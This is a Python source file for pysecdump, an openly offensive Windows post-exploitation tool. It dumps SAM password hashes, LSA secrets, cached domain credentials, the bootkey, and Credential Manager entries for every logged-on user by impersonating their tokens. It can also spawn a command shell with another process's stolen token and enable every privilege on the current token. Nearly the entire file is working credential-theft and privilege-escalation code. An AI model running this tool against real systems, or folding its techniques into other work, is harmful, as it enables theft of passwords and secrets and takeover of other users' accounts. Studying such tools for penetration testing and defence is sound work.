#!/usr/bin/env python3

# This file is part of creddump.
#
# creddump is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# creddump is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with creddump.  If not, see <http://www.gnu.org/licenses/>.

from framework.win32.domcachedumplive import dump_file_hashes as cachedump_reg_hashes
from framework.win32.hashdumplive import dump_hashes as hashdump_reg_hashes
from framework.win32.hashdumplive import get_bootkey
from framework.win32.lsasecretslive import get_live_secrets
from optparse import OptionParser
from optparse import OptionGroup
import win32process
import win32event
import pywintypes
import win32security
import win32api
import win32con
import ntsecuritycon
import win32cred
from wpc.processes import processes
from wpc.thread import thread
from binascii import hexlify
import sys

version = "2.0"


def parseOptions():
    print("pysecdump v%s https://github.com/pentestmonkey/pysecdump" % version)
    usage = "%s (dump opts | shell opts | -h) " % (sys.argv[0])

    parser = OptionParser(usage=usage, version=version)

    dump = OptionGroup(parser, "dump opts", "Choose what you want to dump")
    shell = OptionGroup(parser, "shell opts", "Get shell with different privs")

    dump.add_option("-a",
                    "--all",
                    dest="do_all",
                    default=False,
                    action="store_true",
                    help="Dump everything")
    dump.add_option("-s",
                    "--samhashes",
                    dest="do_samhashes",
                    default=False,
                    action="store_true",
                    help="Dump hashes from SAM (registry)")
    dump.add_option("-l",
                    "--lsasecrets",
                    dest="do_lsasecrets",
                    default=False,
                    action="store_true",
                    help="Dump LSA Secrets (registry)")
    dump.add_option("-c",
                    "--cacheddomcreds",
                    dest="do_cacheddomcreds",
                    default=False,
                    action="store_true",
                    help="Dump Cached Domain Creds (registry)")
    dump.add_option(
        "-C",
        "--credman",
        dest="do_credman",
        default=False,
        action="store_true",
        help=
        "Dump Credential Manager for all logged in users (API call) - can't do all passwords types"
    )
    dump.add_option("-b",
                    "--bootkey",
                    dest="do_bootkey",
                    default=False,
                    action="store_true",
                    help="Dump Bootkey (registry)")

    shell.add_option("-i",
                     "--impersonate",
                     dest="pid",
                     default=False,
                     help="Impersonate a process")
    shell.add_option("-e",
                     "--enable_privs",
                     dest="enable_privs",
                     default=False,
                     action="store_true",
                     help="Enable all privs in current token")

    parser.add_option_group(dump)
    parser.add_option_group(shell)

    (options, args) = parser.parse_args()

    if not (options.do_all or options.do_samhashes or options.do_lsasecrets
            or options.do_cacheddomcreds or options.do_bootkey
            or options.do_credman or options.pid or options.enable_privs):
        print(
            "[E] Specify at least one of: -a, -s, -l, -c, -b, -C, -t, -e.  -h for help."
        )
        sys.exit()

    return options


def shell_as(th, enable_privs=0):
    t = thread(th)
    print(t.as_text())
    new_tokenh = win32security.DuplicateTokenEx(
        th, 3, win32con.MAXIMUM_ALLOWED, win32security.TokenPrimary,
        win32security.SECURITY_ATTRIBUTES())
    print("new_tokenh: %s" % new_tokenh)
    print("Impersonating...")
    if enable_privs:
        get_all_privs(new_tokenh)
    commandLine = "cmd"
    si = win32process.STARTUPINFO()
    print("pysecdump: Starting shell with required privileges...")
    (hProcess, hThread, dwProcessId,
     dwThreadId) = win32process.CreateProcessAsUser(
         new_tokenh,
         None,  # AppName
         commandLine,  # Command line
         None,  # Process Security
         None,  # ThreadSecurity
         1,  # Inherit Handles?
         win32process.NORMAL_PRIORITY_CLASS,
         None,  # New environment
         None,  # Current directory
         si)  # startup info.
    win32event.WaitForSingleObject(hProcess, win32event.INFINITE)
    print("pysecdump: Quitting")


def get_all_privs(th):
    # Try to give ourselves some extra privs (only works if we're admin):
    # SeBackupPrivilege   - so we can read anything
    # SeDebugPrivilege    - so we can find out about other processes (otherwise OpenProcess will fail for some)
    # SeSecurityPrivilege - ??? what does this do?

    # Problem: Vista+ support "Protected" processes, e.g. audiodg.exe.  We can't see info about these.
    # Interesting post on why Protected Process aren't really secure anyway: http://www.alex-ionescu.com/?p=34

    privs = win32security.GetTokenInformation(th,
                                              ntsecuritycon.TokenPrivileges)
    for privtuple in privs:
        privs2 = win32security.GetTokenInformation(
            th, ntsecuritycon.TokenPrivileges)
        newprivs = []
        for privtuple2 in privs2:
            if privtuple2[0] == privtuple[0]:
                newprivs.append((privtuple2[0], 2))  # SE_PRIVILEGE_ENABLED
            else:
                newprivs.append((privtuple2[0], privtuple2[1]))

        # Adjust privs
        privs3 = tuple(newprivs)
        win32security.AdjustTokenPrivileges(th, False, privs3)


FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.'
                  for x in range(256)])
BFILTER = bytearray()
for c in FILTER:
    BFILTER.append(ord(c))


def dump(src, length=8):
    # Hex dump code from
    # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/142812

    N = 0
    result = ''
    while src:
        s, src = src[:length], src[length:]
        hexa = ' '.join(["%02X" % x for x in s])
        su = s
        uni_string = ''
        for n in range(0, int(len(su) / 2)):
            if su[n * 2 + 1] == 0:
                uni_string += su[n * 2:n * 2 + 1].decode()
            else:
                uni_string += '?'
        try:
            s = s.decode().translate(FILTER)
        except UnicodeDecodeError:
            s = s.translate(BFILTER)

        result += "%04X %-*s%-16s %s\n" % (N, length * 3, hexa, s, uni_string)
        N += length
    return result


def section(message):
    print
    print("[ %s ... ]" % message)
    print


def get_credman_creds(quiet=0):
    try:
        creds = win32cred.CredEnumerate(None, 0)
        return creds
    except pywintypes.error as e:
        if not quiet:
            if e.winerror == 1004:
                print(
                    "[E] Call to CredEnumerate failed: Invalid flags.  This doesn't work on XP/2003."
                )
            elif e.winerror == 1168:
                print(
                    "[E] Call to CredEnumerate failed: Element not found.  No credentials stored for this user.  Run as normal user, not SYSTEM."
                )
            elif e.winerror == 1312:
                print(
                    "[E] Call to CredEnumerate failed: No such login session.  Only works for proper login session - not network logons."
                )
            else:
                print(f"[E] Call to CredEnumerate failed: {e}")
        return None


def dump_cred(package):
    for k in package.keys():
        if k == "CredentialBlob":
            if package[k]:
                print("%s:" % k)
                sys.stdout.write(dump(package[k], 16))
            else:
                print("%s: %s" % (k, "<empty / cannot decrypt>"))
        else:
            print("%s: %s" % (k, package[k]))
    print()


options = parseOptions()

# bootkey
if options.do_all or options.do_bootkey:
    section("Dumping Bootkey")
    bootkey = get_bootkey()
    print(f"Bootkey: {hexlify(bootkey).decode()}")

# cachedump
if options.do_all or options.do_cacheddomcreds:
    section("Dumping Cached Domain Credentials")
    got_a_hash = 0
    for hash in cachedump_reg_hashes():
        got_a_hash = 1
        print(hash)

    if not got_a_hash:
        print(
            "[E] No cached hashes. Are you running as SYSTEM? Or machine not a domain member?"
        )

# pwdump
if options.do_all or options.do_samhashes:
    section("Dumping Password Hashes From SAM")
    got_a_hash = 0
    for hash in hashdump_reg_hashes():
        got_a_hash = 1
        print(hash)

    if not got_a_hash:
        print("[E] No hashes.  Are you running as SYSTEM?")

# credman
if options.do_all or options.do_credman:
    section("Dumping Current User's Credentials from Credential Manager")
    creds = get_credman_creds()
    if creds:
        for package in creds:
            dump_cred(package)

    def get_token(t):
        ret = None
        try:
            xt = t.get_token_user()
            ret = xt.get_fq_name().encode()
        except pywintypes.error as e:
            pywintypes_errors = {5: 'Access Denied'}
            print(
                f'Error: {pywintypes_errors.get(e.winerror, f"Unknown {e}")}')
        return ret

    sid_done = {}
    for p in processes().get_all():
        for t in p.get_tokens():
            x = get_token(t)
            if x in sid_done.keys():
                pass
            else:
                sid_done[x] = 1
                section("Dumping Credentials from Credential Manager for: %s" %
                        x)
                try:
                    win32security.ImpersonateLoggedOnUser(t.get_th())
                except pywintypes.error as e:
                    if e.winerror == 5:
                        continue
                creds = get_credman_creds()
                if creds:
                    for package in creds:
                        dump_cred(package)
                win32security.RevertToSelf()

# lsadump
if options.do_all or options.do_lsasecrets:
    section("Dumping LSA Secrets")
    secrets = get_live_secrets()
    if not secrets:
        print("[E] Unable to read LSA secrets.  Perhaps you are not SYTEM?")
    else:
        for k in sorted(secrets.keys()):
            print(k)
            print(dump(secrets[k], length=16))

# shell with privileges of another process
if options.pid:
    found = 0
    for p in processes().get_all():
        if p.get_pid() == int(options.pid):
            found = 1
            print(p.as_text())
            for t in p.get_tokens():
                shell_as(t.get_th(), options.enable_privs)
    if not found:
        print("[E] Could not find process with PID %s" % options.pid)

# shell with all privs enabled
elif options.enable_privs:
    th = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                        win32con.MAXIMUM_ALLOWED)
    shell_as(th, options.enable_privs)
